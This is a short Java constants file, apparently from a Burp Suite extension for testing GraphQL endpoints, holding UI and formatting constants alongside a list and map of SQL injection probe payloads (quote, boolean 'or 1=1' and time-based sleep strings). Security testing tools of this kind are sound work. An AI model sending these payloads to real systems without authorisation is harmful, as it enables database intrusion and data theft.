package burp.utils;

import java.util.HashMap;
import java.util.Map;

public class Constants {
    static public String TREE_STATUS_EXPAND = "▼";
    static public String TREE_STATUS_COLLAPSE = "▶";

    static public String TAB_COLOR_SELECTED = "0xffc599";
    static public String TAB_COLOR_MAIN_DATA = "0xf2f2f2";
    static public String TAB_COLOR_SUB_DATA = "0xffffff";

    static public String GRAPHQL_SPACE = " ";
    static public String GRAPHQL_NEW_LINE = "\n";
    static public String GRAPHQL_TAB = "    ";

    static public String[] payloads = new String[]{
            "",
            "'",
            "'+and+'1'='1",
            "'+or+'1'='1",
            "'+and+sleep(10)%23",
            "+and+sleep(5)+-- "
    };

    static public Map<String, String > payloadsMap  = new HashMap<String, String>(){{
        put("1","");
        put("2","'");
        put("3","'+and+'1'='1");
        put("4","'+or+'1'='1");
        put("5","'+and+sleep(10)%23");
        put("6","'+and+sleep(5)+-- ");
    }};
}
